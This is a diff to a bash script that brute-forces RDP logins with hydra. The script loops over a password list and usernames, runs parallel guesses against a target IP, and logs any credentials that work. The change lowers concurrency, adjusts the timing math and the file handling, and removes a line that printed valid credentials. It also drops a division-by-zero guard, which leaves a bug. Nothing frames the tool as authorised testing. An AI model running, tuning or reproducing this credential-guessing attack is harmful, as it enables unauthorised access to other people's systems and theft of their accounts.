@@ -14,7 +14,7 @@ checked_passwords_log="checked_passwords_log.txt"
 [[ ! -f "$temp_passwords_file" ]] && touch "$temp_passwords_file"
 [[ ! -f "$checked_passwords_log" ]] && touch "$checked_passwords_log"
 
-# Function to clean up and save passwords before exiting
+# Function to clean up before exiting (does not modify passwords.txt)
 cleanup() {
     echo "Saving current state of passwords..."
     mv "$temp_passwords_file" "$passwords_file"
@@ -60,7 +60,6 @@ attempt_login() {
     if echo "$hydra_output" | grep -q "success"; then
         echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp://$rdp_ip using password: $password" >> "$success_log_file"
         ((successful_attempts++))
-        echo "Valid credentials: $username:$password on rdp://$rdp_ip"
     fi
 }
 
@@ -80,8 +79,8 @@ for index in "${!passwords[@]}"; do
         attempt_login "$entry" "$password" &
         ((attempts++))
 
-        # Limit to 13 concurrent jobs to reduce load
-        while (( $(jobs -r -p | wc -l) >= 13 )); do
+        # Limit to 5 concurrent jobs to reduce load
+        while (( $(jobs -r -p | wc -l) >= 5 )); do
             wait -n  # Wait for at least one job to finish
         done
     done
@@ -95,7 +94,7 @@ for index in "${!passwords[@]}"; do
 
     # Calculate speed of attempts (in seconds per attempt)
     if (( attempts > 0 )); then
-        speed=$(( password_duration / attempts ))  # Use integer division
+        speed=$(bc -l <<< "scale=2; $password_duration / $attempts")  # Calculate speed as duration divided by attempts
     else
         speed="N/A"  # If no attempts, set speed to N/A
     fi
@@ -105,19 +104,23 @@ for index in "${!passwords[@]}"; do
     echo -e "Time taken for password '$password': $password_duration seconds, Speed: $speed seconds/attempt."
 
     # Save the checked password for final cleanup
-    echo "$password" >> "$temp_passwords_file"
+    echo "$password" >> "$temp_passwords_file"  
 done
 
 # Wait for any remaining background jobs
 wait
 
-# Create a new passwords file without the checked passwords
-mv "$temp_passwords_file" "$passwords_file"
+# Move the temp_passwords_file back to passwords_file only if it is different
+if ! cmp -s "$temp_passwords_file" "$passwords_file"; then
+    mv "$temp_passwords_file" "$passwords_file"
+else
+    rm "$temp_passwords_file"
+fi
 
 # Calculate elapsed time and estimate remaining time
 end_time=$(date +%s)
 elapsed_time=$(( end_time - start_time ))
-avg_time_per_password=$(( elapsed_time / (successful_attempts + 1) ))  # +1 to prevent division by zero
+avg_time_per_password=$(( elapsed_time / successful_attempts ))
 remaining_passwords=$(wc -l < "$passwords_file")
 estimated_time=$(( remaining_passwords * avg_time_per_password ))
 
